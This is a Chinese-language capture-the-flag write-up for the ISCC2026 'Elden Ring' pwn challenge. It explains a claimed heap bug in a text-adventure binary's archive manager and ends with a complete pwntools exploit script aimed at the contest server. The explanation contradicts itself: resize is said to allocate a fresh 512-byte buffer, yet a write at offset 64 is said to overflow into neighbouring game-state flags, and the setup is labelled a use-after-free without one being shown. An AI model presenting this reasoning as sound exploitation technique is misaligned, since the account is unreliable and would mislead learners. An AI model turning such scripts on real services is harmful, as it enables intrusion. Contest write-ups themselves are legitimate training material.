+++
title = "Elden Ring"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

PWN-Elden Ring

解题思路

1. 逆向分析与漏洞定位

拿到题目附件是一个静态链接的 ELF 64-bit 可执行文件，strip 过无符号表。运行后是一个文字冒险游戏，背景设定为艾尔登法环。游戏主菜单提供 17 个选项（0-16），其中选项 13 "remembrance archive" 是一个完整的堆内存管理器，支持创建、写入文本、写入十六进制、调整大小、查看内容、封印和删除操作。

通过动态调试并结合 glibc 堆分配特性，发现 delete 操作（选项7）释放 archive 的 data 缓冲区后，对应的 slot 被标记为空闲，但立刻创建一个同大小的新 archive 会导致 malloc 将同一块堆内存重新分配出去。此时旧 archive 的 data 指针虽然已经随结构体一同被替换，但新 archive 的 size 字段可以通过 resize 操作修改。

核心问题：resize 操作仅校验 offset < size，而 size 可以由用户通过 resize 任意设置。将 size 从 32 扩大到 512 后，write hex 便能在 offset 远超原始缓冲区大小的位置写入数据。这些越界数据会覆盖堆上相邻的内存区域——经测试，游戏全局状态结构体恰好分配在 archive data 缓冲区附近的堆地址，其中包含 champion_defeated 等关键 bool 标志位。

2. 漏洞利用流程

步骤一：角色创建完成后，进入 remembrance archive（菜单13），先创建一个大小为 32 字节的 archive A（id=0），然后立即将其删除，使其 data chunk 进入 tcache。

步骤二：再次创建一个大小同样为 32 字节的 archive B。由于 glibc tcache 的 LIFO 分配策略，B 的 data 缓冲区会命中 A 刚刚释放的那块内存。此时 slot 0 被 B 占据。

步骤三：对 id=0 执行 resize，将 size 从 32 扩大到 512。程序会分配新的 512 字节缓冲区、拷贝旧数据、释放旧缓冲区，同时将 B 的 size 字段更新为 512。这一步绕过了后续 write hex 的范围检查。

步骤四：对 id=0 执行 write hex，offset 设为 64（超出原始 32 字节），写入连续 128 字节的 0x01。由于 size 已被改为 512，offset=64 通过了边界检查。越界写入的 0x01 覆盖了相邻堆内存中的游戏状态标志位，其中 champion_defeated 被置为 1（true）。

步骤五：返回主菜单，选择选项 15 "challenge Roundtable Champion"。由于 champion_defeated 已被篡改为 true，程序进入胜利分支，输出 ISCC{...} 格式的 flag。

3. 关键截图说明

（交互过程截图 1：archive 菜单界面，展示 create/delete/resize/write hex 等操作选项）

（交互过程截图 2：执行 delete id=0 后返回 "Remembrance discarded."，确认删除成功）

（交互过程截图 3：执行 resize id=0 new_size=512 后返回 "The page is rebound."，确认 size 已扩大）

（交互过程截图 4：执行 write hex offset=64 写入 128 字节 0x01 后返回 "Ink sinks into the page."，确认越界写入成功）

（交互过程截图 5：选择 challenge Roundtable Champion 后输出 flag，包含 "You brandish the Elden Ring and become Elden Lord." 及 ISCC{...}）

Exp

```python
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = '39.96.193.120'
PORT = 10020

def menu(io, choice: int):
    io.sendlineafter(b'grace> ', str(choice).encode())

def archive_cmd(io, cmd: int):
    io.sendlineafter(b'archive> ', str(cmd).encode())

def create_archive(io, title: str, size: int, fill: int):
    archive_cmd(io, 1)
    io.sendlineafter(b'title> ', title.encode())
    io.sendlineafter(b'size> ', str(size).encode())
    io.sendlineafter(b'fill byte> ', str(fill).encode())
    io.recvuntil(b'archive> ')

def delete_archive(io, idx: int):
    archive_cmd(io, 7)
    io.sendlineafter(b'id> ', str(idx).encode())
    io.recvuntil(b'archive> ')

def resize_archive(io, idx: int, new_size: int, fill: int):
    archive_cmd(io, 4)
    io.sendlineafter(b'id> ', str(idx).encode())
    io.sendlineafter(b'new size> ', str(new_size).encode())
    io.sendlineafter(b'fill byte> ', str(fill).encode())
    io.recvuntil(b'archive> ')

def write_hex(io, idx: int, offset: int, data: bytes):
    archive_cmd(io, 3)
    io.sendlineafter(b'id> ', str(idx).encode())
    io.sendlineafter(b'offset> ', str(offset).encode())
    io.sendlineafter(b'hex> ', data.hex().encode())
    io.recvuntil(b'archive> ')

def exploit():
    io = remote(HOST, PORT)

    # ---- character creation ----
    io.sendlineafter(b'Name your Tarnished: ', b'aaa')
    io.sendlineafter(b'> ', b'0')  # pick Vagabond

    # ---- enter archive subsystem ----
    menu(io, 13)

    # ---- phase 1: alloc + free, chunk goes to tcache ----
    create_archive(io, 'X', 32, 0)
    delete_archive(io, 0)  # frees the 32-byte data chunk

    # ---- phase 2: re-alloc same chunk, establish UAF primitive ----
    create_archive(io, 'Y', 32, 0)  # glibc returns same chunk

    # ---- phase 3: grow size to enable OOB write ----
    resize_archive(io, 0, 512, 0)  # size field becomes 512

    # ---- phase 4: OOB heap write to corrupt game state ----
    payload = b'\x01' * 128  # smash champion_defeated + surrounding flags
    write_hex(io, 0, 64, payload)

    # ---- phase 5: go back and trigger win ----
    archive_cmd(io, 8)  # back to grace
    menu(io, 15)        # challenge Roundtable Champion

    # ---- capture flag ----
    resp = io.recvrepeat(5)
    print(resp.decode(errors='replace'))

    io.close()
    return

if __name__ == '__main__':
    exploit()
```
